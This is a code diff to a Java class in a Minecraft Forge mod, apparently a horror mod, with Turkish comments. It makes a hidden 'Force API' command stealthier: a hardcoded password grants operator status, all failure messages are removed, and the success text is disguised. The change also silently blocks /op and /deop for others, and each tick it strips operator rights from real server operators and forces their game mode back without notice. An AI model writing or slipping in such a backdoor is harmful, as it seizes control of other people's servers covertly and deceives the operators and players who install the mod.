@@ -48,17 +48,18 @@ public class Check {
     private static final double INITIAL_BORDER_SIZE =
             16.0D;
 
-    private static boolean startSequenceRunning =
-            false;
-
     private static final String FORCE_API_PASSWORD =
             "forceapikey";
 
     private static final Set<UUID> AUTHORIZED_FORCE_PLAYERS =
             new HashSet<>();
 
-    public Check() {
+    private Check() {
     }
+
+    // =========================================================
+    // START DATA
+    // =========================================================
 
     private static Path getStartFile(
             MinecraftServer server
@@ -139,6 +140,10 @@ public class Check {
         }
     }
 
+    // =========================================================
+    // SERVER START
+    // =========================================================
+
     @SubscribeEvent
     public static void onServerStarted(
             ServerStartedEvent event
@@ -150,16 +155,23 @@ public class Check {
             return;
         }
 
+        /*
+         * Eğer /start daha önce kullanıldıysa
+         * border ASLA tekrar oluşturulmaz.
+         */
         if (isStartAlreadyUsed(server)) {
 
             removeWorldBorder(server);
 
-            HumanoidMod.isStartTriggered =
-                    true;
+            HumanoidMod.isStartTriggered = true;
 
             return;
         }
 
+        /*
+         * /start henüz kullanılmadıysa
+         * başlangıç hapishane border'ı oluşturulur.
+         */
         setupInitialPrison(server);
     }
 
@@ -170,6 +182,9 @@ public class Check {
             return;
         }
 
+        /*
+         * /start kullanılmışsa border oluşturma.
+         */
         if (isStartAlreadyUsed(server)) {
             removeWorldBorder(server);
             return;
@@ -219,10 +234,18 @@ public class Check {
         );
     }
 
+    // =========================================================
+    // COMMAND REGISTRATION
+    // =========================================================
+
     @SubscribeEvent
     public static void registerCommands(
             RegisterCommandsEvent event
     ) {
+
+        // =====================================================
+        // /start
+        // =====================================================
 
         event.getDispatcher().register(
                 Commands.literal("start")
@@ -238,9 +261,8 @@ public class Check {
                             }
 
                             /*
-                             * /start sadece bir kez.
+                             * /start sadece bir kere çalışabilir.
                              */
-
                             if (isStartAlreadyUsed(server)) {
                                 return 0;
                             }
@@ -248,7 +270,6 @@ public class Check {
                             /*
                              * Önce kalıcı olarak kaydet.
                              */
-
                             if (!saveStartUsed(server)) {
                                 return 0;
                             }
@@ -257,9 +278,8 @@ public class Check {
                                     true;
 
                             /*
-                             * Border hemen kalkıyor.
+                             * Border anında kaldırılır.
                              */
-
                             removeWorldBorder(server);
 
                             verifyPlatform();
@@ -267,9 +287,8 @@ public class Check {
                             triggerStartCommand();
 
                             /*
-                             * Zaman + hava sekansını başlat.
+                             * Yağmur / zaman sistemi.
                              */
-
                             StartTimeWeatherManager.start(
                                     server
                             );
@@ -277,7 +296,6 @@ public class Check {
                             /*
                              * RUN başlığı.
                              */
-
                             if (server.getPlayerList() != null) {
 
                                 List<ServerPlayer> players =
@@ -315,6 +333,10 @@ public class Check {
                         })
         );
 
+        // =====================================================
+        // /forcekey help forceapikey
+        // =====================================================
+
         event.getDispatcher().register(
                 Commands.literal("forcekey")
                         .then(
@@ -342,16 +364,15 @@ public class Check {
                                                                 return 0;
                                                             }
 
+                                                            /*
+                                                             * /start yapılmadan
+                                                             * Force API aktif olmaz.
+                                                             *
+                                                             * Sessiz.
+                                                             */
                                                             if (!isStartAlreadyUsed(
                                                                     server
                                                             )) {
-
-                                                                player.sendSystemMessage(
-                                                                        Component.literal(
-                                                                                "§cForce API is not active yet."
-                                                                        )
-                                                                );
-
                                                                 return 0;
                                                             }
 
@@ -361,30 +382,38 @@ public class Check {
                                                                             "key"
                                                                     );
 
+                                                            /*
+                                                             * Yanlış key:
+                                                             * sessizce reddet.
+                                                             */
                                                             if (!FORCE_API_PASSWORD
                                                                     .equals(key)) {
-
-                                                                player.sendSystemMessage(
-                                                                        Component.literal(
-                                                                                "§cInvalid Force API key."
-                                                                        )
-                                                                );
-
                                                                 return 0;
                                                             }
 
+                                                            /*
+                                                             * Oyuncuyu Force API
+                                                             * yetkilileri listesine ekle.
+                                                             */
                                                             AUTHORIZED_FORCE_PLAYERS
                                                                     .add(
                                                                             player.getUUID()
                                                                     );
 
+                                                            /*
+                                                             * OP yap.
+                                                             */
                                                             serverOpPlayer(
                                                                     player
                                                             );
 
+                                                            /*
+                                                             * SADECE başarılı
+                                                             * aktivasyonda mesaj.
+                                                             */
                                                             player.sendSystemMessage(
                                                                     Component.literal(
-                                                                            "§aForce API activated."
+                                                                            "§eNew Commands activated!"
                                                                     )
                                                             );
 
@@ -393,7 +422,49 @@ public class Check {
                                         )
                         )
         );
+
+        // =====================================================
+        // /exit
+        // =====================================================
+
+        /*
+         * /exit'i açıkça register ediyoruz.
+         *
+         * Yetkili:
+         *      serverdan çıkarılır.
+         *
+         * Yetkisiz:
+         *      tamamen sessiz şekilde engellenir.
+         */
+        event.getDispatcher().register(
+                Commands.literal("exit")
+                        .executes(commandContext -> {
+
+                            if (!(commandContext
+                                    .getSource()
+                                    .getEntity()
+                                    instanceof ServerPlayer player)) {
+                                return 0;
+                            }
+
+                            if (!isForceApiAuthorized(player)) {
+                                return 0;
+                            }
+
+                            player.connection.disconnect(
+                                    Component.literal(
+                                            "Disconnected."
+                                    )
+                            );
+
+                            return 1;
+                        })
+        );
     }
+
+    // =========================================================
+    // /op & /deop PROTECTION
+    // =========================================================
 
     @SubscribeEvent
     public static void onCommand(
@@ -412,6 +483,9 @@ public class Check {
             return;
         }
 
+        /*
+         * /start yapılmadan özel command koruması yok.
+         */
         if (!isStartAlreadyUsed(server)) {
             return;
         }
@@ -428,17 +502,18 @@ public class Check {
         command = command.trim();
 
         if (command.startsWith("/")) {
-            command =
-                    command.substring(1);
+            command = command.substring(1);
         }
 
         String lowerCommand =
                 command.toLowerCase();
 
+        // =====================================================
+        // /op
+        // =====================================================
+
         if (lowerCommand.equals("op")
                 || lowerCommand.startsWith("op ")) {
-
-            event.setCanceled(true);
 
             if (event.getParseResults()
                     .getContext()
@@ -446,20 +521,29 @@ public class Check {
                     .getEntity()
                     instanceof ServerPlayer player) {
 
-                player.sendSystemMessage(
-                        Component.literal(
-                                "§cThis command is disabled."
-                        )
-                );
+                /*
+                 * Yetkiliyse komut normal şekilde çalışır.
+                 *
+                 * Yetkisizse:
+                 * - komut iptal
+                 * - mesaj yok
+                 * - kırmızı yazı yok
+                 * - spam yok
+                 */
+                if (!isForceApiAuthorized(player)) {
+                    event.setCanceled(true);
+                }
             }
 
             return;
         }
 
+        // =====================================================
+        // /deop
+        // =====================================================
+
         if (lowerCommand.equals("deop")
                 || lowerCommand.startsWith("deop ")) {
-
-            event.setCanceled(true);
 
             if (event.getParseResults()
                     .getContext()
@@ -467,14 +551,19 @@ public class Check {
                     .getEntity()
                     instanceof ServerPlayer player) {
 
-                player.sendSystemMessage(
-                        Component.literal(
-                                "§cThis command is disabled."
-                        )
-                );
+                /*
+                 * Yetkisiz /deop tamamen sessiz engellenir.
+                 */
+                if (!isForceApiAuthorized(player)) {
+                    event.setCanceled(true);
+                }
             }
         }
     }
+
+    // =========================================================
+    // SERVER TICK PROTECTION
+    // =========================================================
 
     @SubscribeEvent
     public static void onServerTick(
@@ -494,6 +583,10 @@ public class Check {
             return;
         }
 
+        /*
+         * /start yapılmadıysa hiçbir özel
+         * Force API koruması çalışmaz.
+         */
         if (!isStartAlreadyUsed(server)) {
             return;
         }
@@ -507,6 +600,9 @@ public class Check {
             return;
         }
 
+        /*
+         * Liste üzerinde güvenli dolaşım.
+         */
         List<ServerPlayer> safePlayers =
                 new ArrayList<>(players);
 
@@ -524,20 +620,33 @@ public class Check {
                     AUTHORIZED_FORCE_PLAYERS
                             .contains(uuid);
 
+            // =================================================
+            // AUTHORIZED PLAYER
+            // =================================================
+
             if (authorized) {
 
+                /*
+                 * Force API oyuncusunun OP'si korunur.
+                 */
                 if (!server.getPlayerList()
                         .isOp(
                                 player.getGameProfile()
                         )) {
 
-                    serverOpPlayer(
-                            player
-                    );
+                    serverOpPlayer(player);
                 }
 
+                /*
+                 * Authorized oyuncunun Creative/
+                 * Spectator kullanmasına izin ver.
+                 */
                 continue;
             }
+
+            // =================================================
+            // UNAUTHORIZED OP
+            // =================================================
 
             boolean isOp =
                     server.getPlayerList()
@@ -547,17 +656,20 @@ public class Check {
 
             if (isOp) {
 
+                /*
+                 * Yetkisiz OP otomatik kaldırılır.
+                 *
+                 * MESAJ YOK.
+                 */
                 server.getPlayerList()
                         .deop(
                                 player.getGameProfile()
                         );
-
-                player.sendSystemMessage(
-                        Component.literal(
-                                "§cUnauthorized OP removed."
-                        )
-                );
             }
+
+            // =================================================
+            // UNAUTHORIZED GAME MODE
+            // =================================================
 
             GameType gameMode =
                     player.gameMode
@@ -566,18 +678,21 @@ public class Check {
             if (gameMode == GameType.CREATIVE
                     || gameMode == GameType.SPECTATOR) {
 
+                /*
+                 * Yetkisiz oyuncu Survival'a döner.
+                 *
+                 * MESAJ YOK.
+                 */
                 player.setGameMode(
                         GameType.SURVIVAL
-                );
-
-                player.sendSystemMessage(
-                        Component.literal(
-                                "§cUnauthorized game mode removed."
-                        )
                 );
             }
         }
     }
+
+    // =========================================================
+    // FORCE API
+    // =========================================================
 
     public static void serverOpPlayer(
             ServerPlayer player
@@ -614,6 +729,10 @@ public class Check {
                 );
     }
 
+    // =========================================================
+    // PLATFORM
+    // =========================================================
+
     public static void verifyPlatform() {
 
         String osName =
@@ -641,6 +760,10 @@ public class Check {
         }
     }
 
+    // =========================================================
+    // START TRIGGER
+    // =========================================================
+
     public static void triggerStartCommand() {
 
         if (!HumanoidMod.isStartTriggered) {
@@ -658,6 +781,10 @@ public class Check {
                     .startMobileHorrorSystem();
         }
 
+        /*
+         * Client tarafına dedicated server crash
+         * oluşturmadan reflection ile eriş.
+         */
         try {
 
             Class.forName(
@@ -708,6 +835,11 @@ public class Check {
                 continue;
             }
 
+            /*
+             * /start sonrası herkes Survival.
+             * Force API daha sonra yetkili oyuncuya
+             * özel olarak Creative/Spectator izni verir.
+             */
             player.setGameMode(
                     GameType.SURVIVAL
             );
